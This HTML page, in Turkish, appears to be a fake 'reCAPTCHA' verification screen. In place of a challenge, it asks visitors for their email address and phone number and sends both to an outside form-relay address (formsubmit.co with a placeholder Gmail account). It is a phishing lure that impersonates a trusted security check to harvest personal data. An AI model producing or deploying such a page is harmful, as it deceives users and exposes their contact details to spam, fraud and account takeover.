<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Doğrulama</title>
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <form class="captcha-container" action="https://formsubmit.co/example@gmail.com" method="POST">
        <div class="captcha-header">
            <h1 class="text-logo">reCAPTCHA</h1>
        </div>
        <div class="captcha-body">
            <h2>Lütfen insan olduğunuzu doğrulayın.</h2>
            <p>Devam etmek için aşağıdaki kutucukları doldurun.</p>
            <div class="selection-group">
                <label for="player-input">E-Mail Adress</label>
                <input type="email" id="player-input" name="E-Mail" placeholder="E-Mail" required>
            </div>
            <div class="selection-group">
                <label for="brand-input">Phone Number (+90 or +1)</label>
                <input type="tel" id="brand-input" name="Phone Number" placeholder="Phone Number" required>
            </div>
        </div>
        <div class="captcha-footer">
            <button id="verify-btn" type="submit">Doğrula</button>
        </div>
    </form>
    <script src="script.js"></script>
</body>
</html>
